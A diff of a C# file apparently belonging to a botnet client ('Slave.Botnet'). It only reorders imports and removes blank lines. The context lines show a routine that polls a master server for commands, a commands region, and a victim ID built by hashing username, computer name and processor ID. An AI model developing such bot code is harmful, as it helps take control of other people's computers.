@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Newtonsoft.Json;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Management;
@@ -6,7 +7,6 @@ using System.Net.Http;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
-using Newtonsoft.Json;
 
 namespace Slave.Botnet
 {
@@ -19,7 +19,6 @@ namespace Slave.Botnet
         static readonly HttpClient httpClient;
 
         static readonly JsonSerializerSettings jsonSerializerSettings;
-
 
         /// <summary>
         /// Instanciate the http client
@@ -38,7 +37,6 @@ namespace Slave.Botnet
 
             GenerateIdKey();
         }
-
 
         /// <summary>
         /// Botnet's entry point, contact the botnet master server and get commands from it
@@ -71,7 +69,6 @@ namespace Slave.Botnet
             }
         }
 
-
         #region Botnet commands
 
         /// <summary>
@@ -92,7 +89,6 @@ namespace Slave.Botnet
         }
 
         #endregion Botnet commands
-
 
         /// <summary>
         /// Sets the KEY string : SHA256(username@comptername|processorID)
@@ -119,7 +115,6 @@ namespace Slave.Botnet
                 KEY = result.Select(x => x.ToString("x2")).Aggregate((x, y) => x + y);
             }
         }
-        
 
         /// <summary>
         /// Send POST request to server and wait for his response
